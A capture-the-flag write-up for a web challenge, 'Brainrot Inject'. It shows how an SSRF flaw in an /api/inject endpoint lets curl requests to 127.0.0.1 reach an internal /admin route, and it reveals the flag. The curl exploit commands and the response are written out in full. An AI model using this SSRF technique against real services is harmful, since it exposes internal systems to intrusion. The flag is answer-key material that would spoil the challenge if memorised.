# Brainrot Inject Writeup

## Challenge

- Name: Brainrot Inject
- Type: Web
- URL: `https://brainrot-injector.sillyctf.psuccso.org/`

## Flag

`sillyCTF{brainrot_v!a_l0calhost}`

## Summary

The frontend submits user input to:

```text
/api/inject?url=<user-controlled-url>
```

Normal external URLs were rejected, but `http://127.0.0.1/` succeeded. That confirmed the backend was performing a server-side fetch of localhost content and returning part of the response in the `preview` field.

Once localhost SSRF was confirmed, probing common internal paths showed that `http://127.0.0.1/admin` exposed a JSON response containing the flag.

## Recon

Homepage source:

```html
<script>
  const res = await fetch(`/api/inject?url=${encodeURIComponent(url)}`);
</script>
```

Initial localhost proof:

```bash
curl -sSLG \
  --data-urlencode 'url=http://127.0.0.1/' \
  'https://brainrot-injector.sillyctf.psuccso.org/api/inject'
```

This returned `success: true` and a preview of the local homepage.

## Exploit

Request:

```bash
curl -sSLG \
  --data-urlencode 'url=http://127.0.0.1/admin' \
  'https://brainrot-injector.sillyctf.psuccso.org/api/inject'
```

Response:

```json
{
  "success": true,
  "brainrot_level": 100,
  "preview": "{\"service\":\"Brainrot Injector Core\",\"status\":\"NPC active\",\"brainrot_level\":\"unrecoverable\",\"flag\":\"sillyCTF{brainrot_v!a_l0calhost}\"}",
  "rendered_url": "http://127.0.0.1/admin"
}
```

## Root Cause

The application allowed attacker-controlled SSRF to localhost and reflected the fetched response body in the API response. An internal-only `/admin` endpoint was therefore reachable through the public service.
